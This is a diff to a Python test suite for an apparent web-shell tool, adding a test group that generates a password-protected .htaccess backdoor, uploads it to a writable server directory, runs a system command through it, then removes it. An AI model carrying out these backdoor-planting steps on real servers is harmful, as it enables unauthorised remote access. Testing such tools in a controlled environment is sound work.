@@ -312,11 +312,18 @@ TS = [
         TC([ urlpwd, 'rm %s/.htaccess' % (writable_dir)], ''),
         TC([ '%s/%s/image.gif password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
         TC([ urlpwd, 'rm %s/image.gif' % (writable_dir)], ''),
-        
-        
         ]),
 
+        TG('generateht', 'Generate and upload htaccess backdoor',
+        [
+        TC([ 'generate.htaccess password /tmp/htaccess' ], 'created with password \'password\''),
+        TC([ urlpwd, ':file.upload /tmp/htaccess %s/.htaccess' % (writable_dir) ], 'File.*uploaded'),
+        TC([ '%s/%s/.htaccess password' % (host, writable_dir), ':system.info os' ], 'Linux'),
+        TC([ urlpwd, 'rm %s/.htaccess' % (writable_dir)], ''),
+        TC([ '%s/%s/.htaccess password' % (host, writable_dir), ':system.info os' ], 'No remote backdoor found'),
+        ]),
       
+
       # TODO: fare l'rm e cancellare tutti i file temporanei
       # Aggiungere il vettore sql da console (magari nn e installato il modulo per php)
       # Nell'help di generate non si capisce dove si mette la pwd
@@ -379,4 +386,4 @@ if __name__ == "__main__":
     if tslist:
         initialize_enviroinment()
         run_tests(tslist)
-        #restore_enviroinment()
+        restore_enviroinment()
